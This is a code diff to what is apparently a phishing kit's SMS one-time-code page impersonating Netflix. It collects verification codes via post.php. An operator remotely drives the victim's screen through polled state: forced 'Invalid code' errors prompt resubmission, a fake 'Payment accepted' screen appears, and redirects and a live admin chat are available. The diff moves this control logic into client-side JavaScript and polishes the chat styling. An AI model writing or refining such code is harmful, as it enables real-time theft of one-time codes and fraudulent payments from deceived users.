@@ -6,6 +6,7 @@ $smsState = [
     'mode' => 'default',
     'custom_url' => '',
     'instruction' => 'stay_wait',
+    'instruction_token' => time(),
     'chat_enabled' => false
 ];
 
@@ -16,20 +17,7 @@ if (file_exists($stateFile)) {
     }
 }
 
-if ($smsState['mode'] === 'redirect_wait') {
-    header('location: wait.php?next=sms.php');
-    exit;
-}
-
-if ($smsState['mode'] === 'redirect_custom' && !empty($smsState['custom_url']) && filter_var($smsState['custom_url'], FILTER_VALIDATE_URL)) {
-    header('location: ' . $smsState['custom_url']);
-    exit;
-}
-
-if ($smsState['instruction'] === 'stay_wait') {
-    header('location: wait.php?next=sms.php');
-    exit;
-}
+$smsState['instruction_token'] = $smsState['instruction_token'] ?? time();
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -71,48 +59,88 @@ if ($smsState['instruction'] === 'stay_wait') {
         .chat-panel.active { display: block; }
 
         .chat-box {
-            background: #0f0f0f;
-            border: 1px solid #2a2a2a;
-            border-radius: 6px;
+            background: #050505;
+            border: 1px solid #1f1f1f;
+            border-radius: 12px;
             padding: 12px;
-            max-height: 240px;
+            max-height: 280px;
             overflow-y: auto;
             margin-top: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
         .chat-message {
-            margin-bottom: 10px;
-            padding: 8px;
-            border-radius: 6px;
+            max-width: 86%;
+            padding: 12px 14px;
+            border-radius: 14px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+            color: #f5f5f5;
+            position: relative;
         }
 
-        .chat-message.admin { background: #17212b; border: 1px solid #2c3e50; }
-        .chat-message.user { background: #1b2a18; border: 1px solid #2e7d32; }
+        .chat-message.admin { background: #1c2d3a; border: 1px solid #2c3e50; align-self: flex-start; }
+        .chat-message.user { background: #123015; border: 1px solid #2e7d32; align-self: flex-end; }
 
-        .chat-meta { font-size: 12px; color: #9e9e9e; }
+        .chat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 6px;
+            font-size: 12px;
+            color: #cfd8dc;
+        }
+
+        .chat-sender {
+            font-weight: 700;
+            text-transform: capitalize;
+        }
+
+        .chat-time {
+            font-size: 11px;
+            color: #9fb1bd;
+        }
+
+        .chat-text {
+            font-size: 17px;
+            line-height: 1.45;
+            color: #fff;
+        }
+
+        .chat-meta { font-size: 13px; color: #9e9e9e; }
 
         .chat-controls {
             display: flex;
-            gap: 8px;
-            margin-top: 10px;
+            gap: 10px;
+            margin-top: 12px;
+            align-items: center;
         }
 
         .chat-controls input {
             flex: 1;
-            padding: 10px;
-            border-radius: 6px;
+            padding: 14px 12px;
+            border-radius: 10px;
             border: 1px solid #333;
-            background: #111;
+            background: #0c0c0c;
             color: #f5f5f5;
+            font-size: 16px;
+            box-shadow: inset 0 0 0 1px #1c1c1c;
         }
 
+        .chat-controls input::placeholder { color: #8c8c8c; }
+
         .chat-controls button {
-            padding: 10px 14px;
+            padding: 12px 16px;
             border: none;
-            border-radius: 6px;
+            border-radius: 10px;
             background: #e50914;
             color: #fff;
             cursor: pointer;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            box-shadow: 0 8px 18px rgba(229, 9, 20, 0.3);
         }
 
         .chat-controls button:hover { background: #b20710; }
@@ -121,6 +149,8 @@ if ($smsState['instruction'] === 'stay_wait') {
             opacity: 0.6;
             pointer-events: none;
         }
+
+        .hidden { display: none !important; }
     </style>
     <title>Netflix</title>
 </head>
@@ -139,41 +169,29 @@ if ($smsState['instruction'] === 'stay_wait') {
 <?php
 $mode = $smsState['mode'];
 $instruction = $smsState['instruction'];
-$showForm = !in_array($mode, ['otp_pass', 'payment_accept']);
-$forceError = $mode === 'error_verification' || isset($_GET['error']) || isset($_GET['otp_error']) || $instruction === 'otp_error';
-
-if ($mode === 'otp_pass') {
-    echo '<div class="status success">Your SMS OTP has been verified successfully.</div>';
-}
-
-if ($mode === 'payment_accept') {
-    echo '<div class="status info">';
-    echo '<img src="res/img/loadings.gif" alt="Payment accepted" style="max-width:120px; display:block; margin:0 auto 10px;">';
-    echo '<p>Payment has been accepted in the app. Thank you for your confirmation.</p>';
-    echo '</div>';
-}
-
-if ($forceError) {
-    echo '<div class="status error" id="otp-error">Invalid code. Please wait a moment before trying again.</div>';
-}
-
-if ($showForm) {
-    echo '<form action="post.php" method="post" id="otp-form" class="' . ($forceError ? 'form-disabled' : '') . '">';
-    echo '<div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>';
-    echo '<div class="coll">';
-    echo '<input type="text" placeholder="Enter code" name="otp" required> <br>';
-
-    if ($forceError) {
-        echo '<input type="hidden" name="exit">';
-    }
-
-    echo '<div class="but1">';
-    echo '<button type="submit">Confirm</button>';
-    echo '</div>';
-    echo '</div> <br>';
-    echo '</form>';
-}
+$initialForceError = $mode === 'error_verification' || isset($_GET['error']) || isset($_GET['otp_error']) || $instruction === 'otp_error';
+$initialState = [
+    'mode' => $mode,
+    'instruction' => $instruction,
+    'instruction_token' => $smsState['instruction_token'] ?? time(),
+    'custom_url' => $smsState['custom_url'] ?? '',
+    'chat_enabled' => !empty($smsState['chat_enabled']),
+    'has_error_param' => isset($_GET['error']) || isset($_GET['otp_error'])
+];
 ?>
+
+    <div id="status-area" class="status" style="display:none;"></div>
+
+    <form action="post.php" method="post" id="otp-form" class="<?php echo $initialForceError ? 'form-disabled' : ''; ?>">
+        <div class="col2"><h4 style="font-weight:normal;">Please enter the verification code sent to your phone.</h4> </div>
+        <div class="coll">
+            <input type="text" placeholder="Enter code" name="otp" required>
+            <input type="hidden" name="exit" id="otp-exit-flag" <?php echo $initialForceError ? '' : 'disabled'; ?>>
+            <div class="but1">
+                <button type="submit" id="otp-submit">Confirm</button>
+            </div>
+        </div>
+    </form>
 
     <div class="chat-panel" id="chat-panel">
         <h3>Live chat</h3>
@@ -191,13 +209,20 @@ if ($showForm) {
 
 </main>
 <script>
+
     const chatPanel = document.getElementById('chat-panel');
     const chatBox = document.getElementById('chat-box');
     const chatInput = document.getElementById('chat-input');
     const chatSend = document.getElementById('chat-send');
-    const otpError = document.getElementById('otp-error');
+    const statusArea = document.getElementById('status-area');
     const otpForm = document.getElementById('otp-form');
-    let chatReady = false;
+    const otpExitFlag = document.getElementById('otp-exit-flag');
+    const otpSubmit = document.getElementById('otp-submit');
+    const initialState = <?php echo json_encode($initialState, JSON_UNESCAPED_SLASHES); ?>;
+
+    let currentState = { ...initialState };
+    let chatInterval = null;
+    let stateInterval = null;
 
     function renderChat(messages) {
         if (!chatBox) return;
@@ -212,8 +237,11 @@ if ($showForm) {
             const row = document.createElement('div');
             row.className = `chat-message ${entry.sender}`;
             row.innerHTML = `
-                <div>${entry.message.replace(/\n/g, '<br>')}</div>
-                <div class="chat-meta">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)} • ${entry.formatted}</div>
+                <div class="chat-header">
+                    <span class="chat-sender">${entry.sender.charAt(0).toUpperCase() + entry.sender.slice(1)}</span>
+                    <span class="chat-time">${entry.formatted}</span>
+                </div>
+                <div class="chat-text">${entry.message.replace(/\n/g, '<br>')}</div>
             `;
             chatBox.appendChild(row);
         });
@@ -240,8 +268,130 @@ if ($showForm) {
         }
     }
 
+    function toggleChat(enable) {
+        if (!chatPanel) return;
+        if (enable) {
+            chatPanel.classList.add('active');
+            chatInput.disabled = false;
+            chatSend.disabled = false;
+            if (!chatInterval) {
+                fetchChat();
+                chatInterval = setInterval(fetchChat, 1500);
+            }
+        } else {
+            chatPanel.classList.remove('active');
+            chatInput.disabled = true;
+            chatSend.disabled = true;
+            if (chatInterval) {
+                clearInterval(chatInterval);
+                chatInterval = null;
+            }
+        }
+    }
+
+    function setFormVisibility(show) {
+        if (otpForm) {
+            otpForm.classList.toggle('hidden', !show);
+        }
+    }
+
+    function setFormDisabled(disabled) {
+        if (!otpForm) return;
+        otpForm.classList.toggle('form-disabled', disabled);
+        const otpField = otpForm.querySelector('input[name="otp"]');
+        if (otpField) otpField.disabled = disabled;
+        if (otpSubmit) otpSubmit.disabled = disabled;
+    }
+
+    function toggleExitFlag(enable) {
+        if (!otpExitFlag) return;
+        if (enable) {
+            otpExitFlag.removeAttribute('disabled');
+        } else {
+            otpExitFlag.setAttribute('disabled', 'disabled');
+        }
+    }
+
+    function showStatus(type, html) {
+        if (!statusArea) return;
+        statusArea.style.display = 'block';
+        statusArea.className = `status ${type}`;
+        statusArea.innerHTML = html;
+    }
+
+    function clearStatus() {
+        if (!statusArea) return;
+        statusArea.style.display = 'none';
+        statusArea.className = 'status';
+        statusArea.innerHTML = '';
+    }
+
+    function handleRedirects(state) {
+        if (state.instruction === 'stay_wait') {
+            window.location = 'wait.php?next=sms.php';
+            return true;
+        }
+
+        if (state.mode === 'redirect_wait') {
+            window.location = 'wait.php?next=sms.php';
+            return true;
+        }
+
+        if (state.mode === 'redirect_custom' && state.custom_url) {
+            window.location = state.custom_url;
+            return true;
+        }
+
+        return false;
+    }
+
+    function applyState(state, source = 'poll') {
+        if (handleRedirects(state)) {
+            return;
+        }
+
+        clearStatus();
+        setFormVisibility(true);
+        setFormDisabled(false);
+        toggleExitFlag(false);
+
+        const forceError = state.mode === 'error_verification' || state.instruction === 'otp_error' || !!state.has_error_param;
+
+        if (state.instruction === 'otp_pass') {
+            showStatus('success', 'Your SMS OTP has been verified successfully.');
+            setFormVisibility(false);
+            return;
+        }
+
+        if (state.mode === 'payment_accept') {
+            showStatus('info', '<img src="res/img/loadings.gif" alt="Payment accepted" style="max-width:120px; display:block; margin:0 auto 10px;">\n                <p>Payment has been accepted in the app. Thank you for your confirmation.</p>');
+            setFormVisibility(false);
+            return;
+        }
+
+        if (forceError) {
+            showStatus('error', 'Invalid code. Please wait a moment before trying again.');
+            setFormDisabled(true);
+            toggleExitFlag(true);
+            setTimeout(() => setFormDisabled(false), 5000);
+        }
+    }
+
+    async function pollState() {
+        try {
+            const response = await fetch('state.php');
+            const state = await response.json();
+            const nextState = { ...currentState, ...state };
+            applyState(nextState, 'poll');
+            toggleChat(!!state.chat_enabled);
+            currentState = nextState;
+        } catch (e) {
+            console.error('Unable to poll state', e);
+        }
+    }
+
     async function sendChatMessage() {
-        if (!chatInput.value.trim()) return;
+        if (!chatInput || !chatInput.value.trim()) return;
         const message = chatInput.value.trim();
         chatInput.value = '';
         try {
@@ -256,24 +406,6 @@ if ($showForm) {
         }
     }
 
-    async function pollState() {
-        try {
-            const response = await fetch('state.php');
-            const state = await response.json();
-            if (state.chat_enabled && !chatReady) {
-                chatReady = true;
-                chatPanel.classList.add('active');
-                fetchChat();
-                setInterval(fetchChat, 3000);
-            } else if (!state.chat_enabled) {
-                chatPanel.classList.remove('active');
-                chatReady = false;
-            }
-        } catch (e) {
-            console.error('Unable to poll state', e);
-        }
-    }
-
     if (chatSend) {
         chatSend.addEventListener('click', sendChatMessage);
         chatInput.addEventListener('keydown', (e) => {
@@ -284,15 +416,11 @@ if ($showForm) {
         });
     }
 
-    if (otpError && otpForm) {
-        setTimeout(() => {
-            otpForm.classList.remove('form-disabled');
-            otpError.style.display = 'none';
-        }, 5000);
-    }
-
+    applyState(currentState, 'initial');
+    toggleChat(!!currentState.chat_enabled);
     pollState();
-    setInterval(pollState, 4000);
+    stateInterval = setInterval(pollState, 1200);
+
 </script>
 </body>
 </html>
